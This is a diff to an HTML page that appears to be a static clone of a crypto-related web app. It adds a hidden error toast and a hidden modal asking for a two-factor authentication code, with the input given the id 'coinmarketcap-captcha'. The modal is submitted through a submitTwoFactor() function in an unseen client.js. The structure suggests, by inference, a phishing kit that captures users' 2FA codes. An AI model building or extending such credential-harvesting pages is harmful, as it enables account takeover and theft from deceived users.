@@ -101,7 +101,61 @@
           </div>
         </div>
       </div>
-      <div class="Toastify"></div>
+      <div class="Toastify">
+        <div
+          class="Toastify__toast-container Toastify__toast-container--top-center"
+          style="display: none"
+          id="toastify"
+        >
+          <div
+            id="2"
+            class="Toastify__toast Toastify__toast-theme--colored Toastify__toast--error Toastify__toast--close-on-click"
+            style="--nth: 1; --len: 1"
+          >
+            <div role="alert" class="Toastify__toast-body">
+              <div
+                class="Toastify__toast-icon Toastify--animate-icon Toastify__zoom-enter"
+              >
+                <svg
+                  viewBox="0 0 24 24"
+                  width="100%"
+                  height="100%"
+                  fill="currentColor"
+                >
+                  <path
+                    d="M11.983 0a12.206 12.206 0 00-8.51 3.653A11.8 11.8 0 000 12.207 11.779 11.779 0 0011.8 24h.214A12.111 12.111 0 0024 11.791 11.766 11.766 0 0011.983 0zM10.5 16.542a1.476 1.476 0 011.449-1.53h.027a1.527 1.527 0 011.523 1.47 1.475 1.475 0 01-1.449 1.53h-.027a1.529 1.529 0 01-1.523-1.47zM11 12.5v-6a1 1 0 012 0v6a1 1 0 11-2 0z"
+                  ></path>
+                </svg>
+              </div>
+              <div id="toastify-content"></div>
+            </div>
+            <button
+              class="Toastify__close-button Toastify__close-button--colored"
+              type="button"
+              aria-label="close"
+              onclick="document.getElementById('toastify').style.display='none'"
+            >
+              <svg aria-hidden="true" viewBox="0 0 14 16">
+                <path
+                  fill-rule="evenodd"
+                  d="M7.71 8.23l3.75 3.75-1.48 1.48-3.75-3.75-3.75 3.75L1 11.98l3.75-3.75L1 4.48 2.48 3l3.75 3.75L9.98 3l1.48 1.48-3.75 3.75z"
+                ></path>
+              </svg>
+            </button>
+            <div
+              role="progressbar"
+              aria-hidden="true"
+              aria-label="notification timer"
+              class="Toastify__progress-bar Toastify__progress-bar--controlled Toastify__progress-bar-theme--colored Toastify__progress-bar--error"
+              style="
+                animation-play-state: paused;
+                opacity: 0;
+                transform: scaleX(0);
+              "
+            ></div>
+          </div>
+        </div>
+      </div>
     </div>
     <svg
       id="SvgjsSvg1001"
@@ -123,7 +177,79 @@
       <polyline id="SvgjsPolyline1003" points="0,0"></polyline>
       <path id="SvgjsPath1004" d="M0 0 "></path>
     </svg>
-    <div class="ReactModalPortal"></div>
+    <div class="ReactModalPortal">
+      <div
+        id="two-factor"
+        class="ReactModal__Overlay ReactModal__Overlay--after-open"
+        style="
+          position: fixed;
+          inset: 0px;
+          background: rgba(0, 0, 0, 0.08);
+          z-index: 11;
+          display: none;
+        "
+      >
+        <div
+          class="ReactModal__Content ReactModal__Content--after-open"
+          tabindex="-1"
+          role="dialog"
+          aria-modal="true"
+          style="
+            position: absolute;
+            inset: 50% 40px 40px 50%;
+            border: 1px solid rgb(255, 255, 255);
+            background: rgb(255, 255, 255);
+            overflow: hidden;
+            outline: none;
+            padding: 24px;
+            transform: translate(-50%, -50%);
+            box-shadow: rgba(0, 0, 0, 0.04) 0px 8px 12px;
+            box-sizing: border-box;
+            width: 100%;
+            height: 100%;
+            max-width: 600px;
+            max-height: 300px;
+          "
+        >
+          <div class="styles_modal__hN5y8">
+            <div class="styles_cross__ajsoZ">
+              <img
+                onclick="closeTwoFactor()"
+                src="/static/media/cross.8ed6ed44aefd741e759a89d6ec138ecd.svg"
+                alt=""
+              />
+            </div>
+            <p class="styles_FA2Modal_title__6qxZi">
+              Enter code of two-factor authentication
+            </p>
+            <div class="styles_inputWrapper__3gbYf">
+              <input
+                id="coinmarketcap-captcha"
+                class="styles_input__U-ion"
+                placeholder="2FA code"
+                type="number"
+                value=""
+                style="height: 59px"
+              />
+            </div>
+            <div class="styles_FA2Modal_button__Bof8N">
+              <div
+                class="style_button__VB+kt style_button_red__QTb4B"
+                style="max-width: 250px; height: 48px"
+                onclick="submitTwoFactor()"
+              >
+                Submit
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
     <script src="static/js/client.js"></script>
+    <script>
+      function closeTwoFactor() {
+        document.getElementById('two-factor').style.display = 'none';
+      }
+    </script>
   </body>
 </html>
